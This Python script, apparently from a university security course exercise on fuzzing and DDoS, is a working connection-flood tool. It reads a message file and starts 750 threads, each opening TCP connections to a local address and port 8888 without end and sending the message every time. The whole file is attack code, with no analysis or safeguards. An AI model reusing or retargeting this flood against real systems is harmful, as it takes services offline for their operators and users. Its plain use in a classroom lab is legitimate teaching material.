import subprocess
import socket
import threading

with open('/media/psf/CS478/Week 7/cs478-fuzz-ddos/msg.txt', 'r') as in_file:
    a = in_file.readlines()
    a = "".join(a)

def main():
    threads = 750
    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def attack():
    dest_ip = '0.0.0.0'
    dest_port = 8888
    target = (dest_ip, dest_port)
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(target)
        sock.sendto(a.encode(), target)




if __name__ == '__main__':
    main()